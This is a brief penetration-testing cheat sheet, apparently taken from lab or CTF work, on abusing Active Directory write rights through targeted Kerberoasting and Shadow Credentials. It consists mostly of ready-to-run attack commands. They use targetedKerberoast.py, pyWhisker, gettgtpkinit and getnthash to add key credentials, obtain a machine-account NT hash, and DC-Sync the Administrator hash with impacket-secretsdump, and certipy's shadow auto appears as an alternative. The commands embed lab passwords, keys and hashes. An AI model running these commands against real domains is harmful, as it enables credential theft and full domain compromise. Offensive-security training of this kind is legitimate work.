
[Read_Blog](https://mayfly277.github.io/posts/GOADv2-pwning-part11/#genericwrite-on-user-jaime---joffrey)

## Targeted Kerberoast

A targeted kerberoast attack can be performed using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).

```
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
```

The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.

The recovered hash can be cracked offline using the tool of your choice.

## Shadow Credentials attack

To abuse this privilege, use [pyWhisker](https://github.com/ShutdownRepo/pywhisker).

```bash
STEPS TO RE_PRODUCE [Add-Key Credentials]!

proxychains python pywhisker.py --domain eu.junon.vl --user svc_backup --password 'b4ckup5821!'  --target "S021M200$" --action list

proxychains python pywhisker.py --domain eu.junon.vl --user svc_backup --password 'b4ckup5821!' --target "S021M200$" --action add -f escape_cert --export pem

NOTE : mostly pfx file bata hunxa ; but can also do via pem.

proxychains python pywhisker.py --domain eu.junon.vl --user svc_backup --password 'b4ckup5821!'  --target "S021M200$" --action list  [ To Check ]

proxychains python gettgtpkinit.py -cert-pem escape_cert_cert.pem -key-pem escape_cert_priv.pem eu.junon.vl/S021M200$ escape.ccache

proxychains python getnthash.py -key 2f5e4d00b61ad945471ecab1e080c25732cf5f6b93dca57b19bc393af412eb2c eu.junon.vl/S021M200$    [ Key  from minikerbereos ]

[ This is machine account hash --> So DC-Sync !]

proxychains -q impacket-secretsdump 'eu.junon.vl/S021M200$'@172.16.21.222 -hashes :e1b96420ba3d8cd93633d3e381a5f5d0 -just-dc-user Administrator

```


To abuse this privilege, can also use  [certipy](https://github.com/ly4k/Certipy).

```

└─# certipy-ad shadow auto -u rasczak@klendathu.vl -p starship99 -account rico -dc-ip 10.10.253.133 -debug

```